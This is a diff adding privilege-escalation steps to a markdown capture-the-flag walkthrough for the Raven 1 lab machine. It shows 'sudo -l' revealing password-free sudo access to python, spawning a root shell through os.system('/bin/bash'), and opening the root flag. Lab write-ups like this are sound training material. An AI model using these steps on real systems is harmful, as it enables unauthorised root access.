@@ -113,3 +113,22 @@
 1. Change the user  
     * Change user from "michael" to "steven" from Raven server  
         - `su steven`  
+
+## Privilege Escalation  
+1. Investigate command  
+    * Execute "sudo -l" command  
+    ![sudo-l](./img/raven1_server16.png)  
+        - `sudo -l`  
+        - We can use the "/usr/bin/python" without password  
+
+1. Execute python shell  
+    * Execute the "/bin/bash"  
+    ![Privilege-Escalation](./img/raven1_server17.png)  
+        - `sudo /usr/bin/python`  
+        - `import os`  
+        - `os.system('/bin/bash')`  
+
+## Credential Access for root user  
+1. Open the root flag file  
+    * Open the flag4.txt  
+    ![Root-flag](./img/raven1_server18.png)  
